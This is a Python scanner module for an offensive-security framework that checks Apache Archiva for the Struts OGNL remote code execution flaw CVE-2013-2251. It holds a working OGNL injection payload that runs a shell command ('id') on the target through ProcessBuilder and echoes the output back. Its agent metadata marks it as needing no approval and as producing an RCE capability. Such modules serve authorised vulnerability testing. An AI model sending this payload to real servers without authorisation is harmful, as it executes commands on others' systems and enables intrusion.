#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache Archiva Struts OGNL RCE (CVE-2013-2251 / S2-016 style)."""

import re
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache Archiva - OGNL RCE Detection (CVE-2013-2251)',
        'description': (
            'Detects CVE-2013-2251 by requesting /security/login.action?redirect:${...} '
            'ProcessBuilder(id) OGNL payload.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2013', 'archiva', 'struts', 'ognl', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2013-2251',
        ],
        'cve': 'CVE-2013-2251',
    }

    def run(self):
        ognl = (
            "${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'id'})).start(),"
            "#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),"
            "#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),"
            "#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),"
            "#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}"
        )
        for base in ('', '/archiva'):
            path = f'{base}/security/login.action?redirect:' + quote(ognl, safe='')
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='Apache Archiva OGNL RCE (CVE-2013-2251)',
                    path=f'{base}/security/login.action',
                )
                return True
        return False
